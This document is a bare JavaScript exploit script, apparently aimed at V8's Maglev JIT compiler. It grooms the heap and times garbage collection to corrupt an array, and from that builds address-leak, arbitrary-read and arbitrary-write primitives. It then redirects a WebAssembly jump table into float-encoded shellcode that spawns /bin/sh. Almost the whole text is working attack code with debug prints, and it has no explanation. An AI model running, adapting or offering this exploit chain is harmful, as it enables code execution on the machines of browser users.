var addrOf_LO = new Array(0x3000);
let corrupted_arr = [7.7];
let obj_arr = [corrupted_arr];

for (var i = 0; i < 0x30; i++)addrOf_LO[i] = 0x11221122;
let index = 0x30;
while (index < 0x60) {
    addrOf_LO[index + 1] = corrupted_arr;
    addrOf_LO[index + 2] = corrupted_arr;
    addrOf_LO[index + 3] = corrupted_arr;
    addrOf_LO[index + 0] = corrupted_arr;
    index += 4;
}
while (index < 0x80) {
    addrOf_LO[index] = 0x11331133;
    index += 1;
}

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;

    }

    nop_nop() {

    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
    print_hex(f) {
        console.log('0x' + this.f64toi64(f).toString(16));
    }
    hex_to_dbl(hexString) {
        if (hexString.startsWith('0x')) {
            hexString = hexString.substring(2);
        }

        for (let i = 0; i < 8; i++) {
            const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
            this.u8[i] = parseInt(byte, 16);
        }

        const float64 = new Float64Array(this.u8.buffer);
        return float64[0];
    }
    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }
    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}

let dogc_flag = false;
function dogc() {
    if (dogc_flag)
        helper.scavenge_gc();
}

var helper = new Helpers();
helper.mark_sweep_gc();
helper.mark_sweep_gc();
// % DebugPrint(corrupted_arr);
// % DebugPrint(obj_arr);
// % DebugPrint(addrOf_LO);
let oob_arr;

class C2 {
}

let fake_object_array;
class C3 extends C2 {
    constructor(obj) {
        try { new.target(); } catch (e) { }
        super();
        const v12 = new Array(32);
        const v14 = new Array(64);
        for (let v13 = 0; v13 < 2; v13++) {
            if (!v13) {
                dogc();
                fake_object_array = [helper.hex_to_dbl("0x6f5001cf091"), helper.hex_to_dbl("0x6f5001cf091"), helper.hex_to_dbl("0x30000001ddf01"), 5.743499907618807e-309]; // runtime
            }
            else {
                obj.c = v12;
                obj.e = corrupted_arr;
                obj.d = v14;
            }
        }
    }
}

let obj = { a: [], c: "a" };
dogc_flag = false;
for (let i = 0; i < 200; i++) {
    dogc_flag = false;
    if (i % 2 == 0) dogc_flag = true;
    dogc();
}

for (let i = 0; i < 1000; i++) {
    dogc_flag = false;
    if (i == 936 || i == 937 || i == 938 || i == 939) {
        dogc_flag = true;
        dogc();
        dogc_flag = false;
    }
    if (i == 940) dogc_flag = true;
    Reflect.construct(C3, [obj], C2);
    Reflect.construct(C3, [obj], C2);

}
// % DebugPrint(C3);
dogc_flag = true;
// helper.scavenge_gc();
// helper.scavenge_gc();
helper.mark_sweep_gc();
helper.mark_sweep_gc();
// % OptimizeMaglevOnNextCall(C3);
Reflect.construct(C3, [obj], C2);
// % OptimizeMaglevOnNextCall(C3);
// % DebugPrint(obj);
let cor = obj.d;
console.log(cor.length);
let found = 0;
for (var i = 0; i < 0x2000; i++) {
    if (cor[i] === helper.hex_to_dbl("0x2244224422442244")) {
        console.log(i);
        found = i;
        break;
    }
}
let leak_addr = [];
let fakeobj_offset = 0;
for (var i = found; i < found + 0x60; i++) {
    if (cor[i] !== helper.hex_to_dbl("0x2244224422442244")) leak_addr.push(cor[i]);
    if (cor[i] === helper.hex_to_dbl("0x2266226622662266")) { fakeobj_offset = i; break; };
}
// console.log(leak_addr);
let corrupted_arr_addr = helper.ftoil(leak_addr[0]);
console.log("corrupted_arr_addr: 0x" + corrupted_arr_addr.toString(16));
let offset = (corrupted_arr_addr - 0x001ddf01) / 8;
console.log("offset: " + offset);
console.log("fakeobj_offset: " + fakeobj_offset);
console.log(helper.f64toi64(cor[offset]).toString(16));
// addrOf_LO[0x60] = corrupted_arr;
// console.log(helper.f64toi64(cor[fakeobj_offset]).toString(16));

function aar(addr) {
    cor[offset] = helper.pair_i32_to_f64(addr - 8, 0x800);
    return corrupted_arr[0];
}

// console.log(helper.f64toi64(aar(corrupted_arr_addr)).toString(16));
// console.log(helper.f64toi64(cor[offset]).toString(16));

function aaw(addr, value) {
    cor[offset] = helper.pair_i32_to_f64(addr - 8, 0x800);
    corrupted_arr[0] = value;
}


function addrof(obj) {
    addrOf_LO[0x60] = obj;
    return helper.ftoih(cor[fakeobj_offset]);
}

console.log(addrof(corrupted_arr).toString(16));

var wasmCode2 = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4,
    109, 97, 105, 110, 0, 0, 10, 73, 1, 71, 0, 68, 184, 47, 115, 104, 0, 144, 235,
    7, 68, 72, 193, 224, 32, 144, 144, 235, 7, 68, 187, 47, 98, 105, 110, 144,
    235, 7, 68, 72, 1, 216, 80, 144, 144, 235, 7, 68, 72, 137, 231, 72, 49, 246,
    235, 7, 68, 72, 49, 210, 72, 49, 192, 235, 7, 68, 176, 59, 15, 5, 144, 144,
    144, 144, 26, 26, 26, 26, 26, 26, 11,
]);
var wasmModule2 = new WebAssembly.Module(wasmCode2);
var wasmInstance2 = new WebAssembly.Instance(wasmModule2, {});
var f2 = wasmInstance2.exports.main;

var wasmCode = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
    130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
    128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128,
    0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10,
    138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

let Instance_addr = addrof(wasmInstance);
console.log("Instance_addr: ", Instance_addr.toString(16));
let jt = helper.ftoih(aar(Instance_addr + 0xc));
console.log("JT: ", jt.toString(16));
let jta = helper.f64toi64(aar(jt + 0x38));
console.log("JTA: ", jta.toString(16));

let Instance2_addr = addrof(wasmInstance2);
console.log("Instance2_addr: ", Instance2_addr.toString(16));
let jt2 = helper.ftoih(aar(Instance2_addr + 0xc));
console.log("JT2: ", jt2.toString(16));
let jta2 = helper.f64toi64(aar(jt2 + 0x38));
console.log("JTA2: ", jta2.toString(16));

aaw(jt+0x38, helper.i64tof64(jta2 + 0x81an));

for (var i = 0; i < 1000; i++) {
    f2();
}

// %DebugPrint(f2);
// % SystemBreak();
f();
  

